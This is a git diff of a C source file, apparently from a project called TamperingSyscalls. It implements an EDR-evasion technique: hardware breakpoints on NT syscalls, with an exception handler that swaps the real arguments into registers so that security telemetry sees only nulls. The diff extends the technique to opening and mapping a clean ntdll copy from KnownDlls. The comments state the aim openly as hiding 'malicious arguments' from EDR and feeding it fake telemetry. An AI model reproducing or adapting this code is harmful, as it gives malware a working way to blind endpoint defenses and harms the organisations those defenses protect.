@@ -5,11 +5,11 @@ TamperingSyscalls
 We set a HWBP on syscall address, remove the HWBP, fix the arguments, and make the call
 Thus avoiding reveal our malicious arguments to the EDR telemetry.
 
-(possibility for you to include your own fake arguments to feed EDR the wrong telemetry. 
+(possibility for you to include your own fake arguments to feed EDR the wrong telemetry.
 Maybe I will write a blog post on this)
 
-We need to setup the states (what we want to fix the arguments to) and then make the right 
-corresponding calls. I have provided one example with NtGetContextThread. 
+We need to setup the states (what we want to fix the arguments to) and then make the right
+corresponding calls. I have provided one example with NtGetContextThread.
 --*/
 #include <Windows.h>
 #include <winternl.h>
@@ -35,26 +35,86 @@ corresponding calls. I have provided one example with NtGetContextThread.
 #define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )
 #pragma endregion
 
+
+#pragma region structs
 // Can't do it for NtResumeThread or NtSetEvent as these are used after the hardware breakpoint is set.
 
 // Need to make a struct with the arguments.
 typedef struct {
 	HANDLE			ThreadHandle;
 	PCONTEXT		pContext;
-} NtGetContextThread;
+} NtGetContextThreadArgs;
+
+typedef struct {
+	PHANDLE			SectionHandle;
+	ACCESS_MASK		DesiredAccess;
+	POBJECT_ATTRIBUTES	ObjectAttributes;
+} NtOpenSectionArgs;
+
+typedef struct {
+	HANDLE			SectionHandle;
+	HANDLE			ProcessHandle;
+	PVOID			BaseAddress;
+	ULONG_PTR		ZeroBits;
+	SIZE_T			CommitSize;
+	PLARGE_INTEGER	SectionOffset;
+	PSIZE_T			ViewSize;
+	DWORD			InheritDisposition;
+	ULONG			AllocationType;
+	ULONG			Win32Protect;
+} NtMapViewOfSectionArgs;
+
+typedef struct {
+	HANDLE			ProcessHandle;
+	PVOID			BaseAddress;
+} NtUnmapViewOfSectionArgs;
 
 typedef struct {
 	int		index;
 	LPVOID	arguments;
 } STATE;
 
-// Need to make a global variable of our struct (which we fix the arguments in the handler)
-NtGetContextThread pNtGetThreadContext;
+#pragma endregion
 
+#pragma region typedefs
+
+typedef NTSTATUS( WINAPI* typeNtOpenSection )(
+	HANDLE* SectionHandle,
+	ACCESS_MASK DesiredAccess,
+	POBJECT_ATTRIBUTES ObjectAttributes
+	);
+
+typedef NTSTATUS( WINAPI* typeNtMapViewOfSection )(
+	HANDLE SectionHandle,
+	HANDLE ProcessHandle,
+	PVOID BaseAddress,
+	ULONG_PTR ZeroBits,
+	SIZE_T CommitSize,
+	PLARGE_INTEGER SectionOffset,
+	PSIZE_T ViewSize,
+	DWORD InheritDisposition,
+	ULONG AllocationType,
+	ULONG Win32Protect
+	);
+
+typedef NTSTATUS( WINAPI* typeNtUnmapViewOfSection )(
+	HANDLE ProcessHandle,
+	PVOID BaseAddress
+	);
+
+#pragma endregion
+
+// Need to make a global variable of our struct (which we fix the arguments in the handler)
+//NtGetContextThreadArgs pNtGetThreadContextArgs;
+NtOpenSectionArgs			pNtOpenSectionArgs;
+NtMapViewOfSectionArgs		pNtMapViewOfSectionArgs;
+NtUnmapViewOfSectionArgs	pNtUnmapViewOfSectionArgs;
 
 // Need to setup states in order you call the functions.
 STATE StateArray[] = {
-	{ 0 , &pNtGetThreadContext},
+	{ 0, &pNtOpenSectionArgs },
+	{ 1, &pNtMapViewOfSectionArgs },
+	{ 2, &pNtUnmapViewOfSectionArgs },
 };
 
 DWORD StatePointer = 0;
@@ -65,43 +125,122 @@ LPVOID FindSyscallAddress( LPVOID function );
 
 VOID SetOneshotHardwareBreakpoint( LPVOID address );
 
-NTSTATUS SpoofSyscaller( PVOID FunctionAddress )
+NTSTATUS SpoofSyscaller( PVOID FunctionAddress );
+
+void RtlInitUnicodeString( PUNICODE_STRING target, PCWSTR source )
 {
-	typedef NTSTATUS( WINAPI* typeReturn )();
+	if( (target->Buffer = (PWSTR)source) )
+	{
+		unsigned int length = wcslen( source ) * sizeof( WCHAR );
+		if( length > 0xfffc )
+			length = 0xfffc;
 
-	SetOneshotHardwareBreakpoint( FindSyscallAddress( FunctionAddress ) );
-
-	typeReturn ReturnNtStatus = (typeReturn)FunctionAddress;
-	NTSTATUS status = ReturnNtStatus();
-
-	return status;
+		target->Length = length;
+		target->MaximumLength = target->Length + sizeof( WCHAR );
+	}
+	else target->Length = target->MaximumLength = 0;
 }
-
 
 int main()
 {
 	SetUnhandledExceptionFilter( OneShotHardwareBreakpointHandler );
 
-	// We populate our global structure of our function arguments.
-	CONTEXT Context;
-	pNtGetThreadContext.pContext = &Context;
-	pNtGetThreadContext.ThreadHandle = OpenThread( THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId() );
+	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-	// You can use API Hashing or something else. It wasn't exclusive to this project so I didn't
-	// include it.
-	LPVOID FunctionAddress = GetProcAddress( GetModuleHandleA( "NTDLL.dll" ), "NtGetContextThread" );
-	
-	NTSTATUS status = SpoofSyscaller( FunctionAddress );
+	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+	LPVOID FunctionAddress = NULL;
+	NTSTATUS status = 0;
+
+	PVOID addr = NULL;
+	ULONG_PTR size = NULL;
+	HANDLE section = INVALID_HANDLE_VALUE;
+	UNICODE_STRING uni;
+	OBJECT_ATTRIBUTES oa;
+	WCHAR buffer[MAX_PATH] = L"\\KnownDlls\\ntdll.dll";
+
+	RtlInitUnicodeString( &uni, buffer );
+	InitializeObjectAttributes( &oa, &uni, OBJ_CASE_INSENSITIVE, NULL, NULL );
+
+
+	pNtOpenSectionArgs.ObjectAttributes = &oa;
+	pNtOpenSectionArgs.SectionHandle = &section;
+	pNtOpenSectionArgs.DesiredAccess = SECTION_MAP_READ | SECTION_MAP_EXECUTE;
+
+	FunctionAddress = GetProcAddress( GetModuleHandleA( "NTDLL.dll" ), "NtOpenSection" );
+	status = SpoofSyscaller( FunctionAddress );
 	if( NT_SUCCESS( status ) ) {
-		PRINT( "Success : %x\n", status );
+		PRINT( "Success : 0x%x\n", status );
 	}
 	else {
-		PRINT( "Error : %x\n", status );
+		PRINT( "Error : 0x%x\n", status );
+	}
+
+	pNtMapViewOfSectionArgs.SectionHandle = section;
+	pNtMapViewOfSectionArgs.ProcessHandle = NtCurrentProcess();
+	pNtMapViewOfSectionArgs.BaseAddress = &addr;
+	pNtMapViewOfSectionArgs.ZeroBits = 0;
+	// Need to set these up in SpoofSyscaller.
+	pNtMapViewOfSectionArgs.CommitSize = 0;
+	pNtMapViewOfSectionArgs.SectionOffset = NULL;
+	pNtMapViewOfSectionArgs.ViewSize = &size;
+	pNtMapViewOfSectionArgs.InheritDisposition = 1;
+	pNtMapViewOfSectionArgs.AllocationType = 0;
+	pNtMapViewOfSectionArgs.Win32Protect = PAGE_READONLY;
+
+	FunctionAddress = GetProcAddress( GetModuleHandleA( "NTDLL.dll" ), "NtMapViewOfSection" );
+	status = SpoofSyscaller( FunctionAddress );
+	if( NT_SUCCESS( status ) ) {
+		PRINT( "Success : 0x%x\n", status );
+	}
+	else {
+		PRINT( "Error : 0x%x\n", status );
+	}
+
+	pNtUnmapViewOfSectionArgs.ProcessHandle = NtCurrentProcess();
+	pNtUnmapViewOfSectionArgs.BaseAddress = addr;
+	FunctionAddress = GetProcAddress( GetModuleHandleA( "NTDLL.dll" ), "NtUnmapViewOfSection" );
+	status = SpoofSyscaller( FunctionAddress );
+	if( NT_SUCCESS( status ) ) {
+		PRINT( "Success : 0x%x\n", status );
+	}
+	else {
+		PRINT( "Error : 0x%x\n", status );
 	}
 
 	return 0;
 }
 
+NTSTATUS SpoofSyscaller( PVOID FunctionAddress )
+{
+	typedef NTSTATUS( WINAPI* defaultType )();
+	NTSTATUS status;
+	SetOneshotHardwareBreakpoint( FindSyscallAddress( FunctionAddress ) );
+
+	// definitions
+	defaultType fDefaultType;
+	typeNtMapViewOfSection fNtMapViewOfSection;
+
+	// Pass the arguments beyond 4th parameter here
+	switch( StatePointer ) {
+	case 0:
+		fDefaultType = (defaultType)FunctionAddress;
+		status = fDefaultType();
+		break;
+	case 1:
+		fNtMapViewOfSection = (typeNtMapViewOfSection)FunctionAddress;
+		status = fNtMapViewOfSection( NULL, NULL, NULL, NULL, pNtMapViewOfSectionArgs.CommitSize,
+			pNtMapViewOfSectionArgs.SectionOffset, pNtMapViewOfSectionArgs.ViewSize, pNtMapViewOfSectionArgs.InheritDisposition,
+			pNtMapViewOfSectionArgs.AllocationType, pNtMapViewOfSectionArgs.Win32Protect );
+		break;
+	case 2:
+		fDefaultType = (defaultType)FunctionAddress;
+		status = fDefaultType();
+		break;
+	}
+
+	return status;
+}
 
 LONG WINAPI OneShotHardwareBreakpointHandler( PEXCEPTION_POINTERS ExceptionInfo )
 {
@@ -117,18 +256,37 @@ LONG WINAPI OneShotHardwareBreakpointHandler( PEXCEPTION_POINTERS ExceptionInfo 
 
 				// You need to fix your arguments in the right registers and stack here.
 				switch( StatePointer ) {
+					// RCX moved into R10!!! Kudos to @anthonyprintup for catching this 
 				case 0:
-					ExceptionInfo->ContextRecord->Rcx =
-						(DWORD_PTR)((NtGetContextThread*)(StateArray[StatePointer].arguments))->ThreadHandle;
+					ExceptionInfo->ContextRecord->R10 =
+						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[StatePointer].arguments))->SectionHandle;
 					ExceptionInfo->ContextRecord->Rdx =
-						(DWORD_PTR)((NtGetContextThread*)(StateArray[StatePointer].arguments))->pContext;
+						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[StatePointer].arguments))->DesiredAccess;
+					ExceptionInfo->ContextRecord->R8 =
+						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[StatePointer].arguments))->ObjectAttributes;
+					break;
 					// put your other states here.
+				case 1:
+					ExceptionInfo->ContextRecord->R10 =
+						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[StatePointer].arguments))->SectionHandle;
+					ExceptionInfo->ContextRecord->Rdx =
+						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[StatePointer].arguments))->ProcessHandle;
+					ExceptionInfo->ContextRecord->R8 =
+						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[StatePointer].arguments))->BaseAddress;
+					ExceptionInfo->ContextRecord->R9 =
+						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[StatePointer].arguments))->ZeroBits;
+					break;
+				case 2:
+					ExceptionInfo->ContextRecord->R10 =
+						(DWORD_PTR)((NtUnmapViewOfSectionArgs*)(StateArray[StatePointer].arguments))->ProcessHandle;
+					ExceptionInfo->ContextRecord->Rdx =
+						(DWORD_PTR)((NtUnmapViewOfSectionArgs*)(StateArray[StatePointer].arguments))->BaseAddress;
+					break;
 
-
-				// you have messed up by not providing the indexed state
+					// you have messed up by not providing the indexed state
 				default:
-					ExceptionInfo->ContextRecord->Rip++;
-					return EXCEPTION_CONTINUE_EXECUTION;
+					ExceptionInfo->ContextRecord->Rip += 1;	// just so we don't hang
+					break;
 				}
 				StatePointer += 1;
 				return EXCEPTION_CONTINUE_EXECUTION;
@@ -149,7 +307,7 @@ DWORD WINAPI RegisterDebug( LPVOID lpParameter )
 	ONE_SHOT* OneShot = (ONE_SHOT*)lpParameter;
 
 	if( !SuspendThread( OneShot->hThread ) ) {
-		
+
 		CONTEXT context = { 0 };
 		context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 		if( GetThreadContext( OneShot->hThread, &context ) )
@@ -166,7 +324,7 @@ DWORD WINAPI RegisterDebug( LPVOID lpParameter )
 		}
 		ResumeThread( OneShot->hThread );
 	}
-	
+
 	SetEvent( OneShot->hSynvnt );
 
 	return 0;
@@ -174,22 +332,22 @@ DWORD WINAPI RegisterDebug( LPVOID lpParameter )
 
 VOID SetOneshotHardwareBreakpoint( LPVOID address )
 {
-	ONE_SHOT* OneShot = 
+	ONE_SHOT* OneShot =
 		(ONE_SHOT*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( ONE_SHOT ) );
-	
+
 	OneShot->address = address;
 	OneShot->hSynvnt = CreateEvent( 0, 0, 0, 0 );
 	OneShot->hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId() );
 
 	HANDLE hThread = CreateThread( 0, 0, RegisterDebug, (LPVOID)OneShot, 0, 0 );
-	
+
 	WaitForSingleObject( OneShot->hSynvnt, INFINITE );
-	
+
 	CloseHandle( OneShot->hSynvnt );
 	CloseHandle( OneShot->hThread );
 	CloseHandle( hThread );
 
-	HeapFree( GetProcessHeap(), 0, OneShot);
+	HeapFree( GetProcessHeap(), 0, OneShot );
 
 	return;
 }
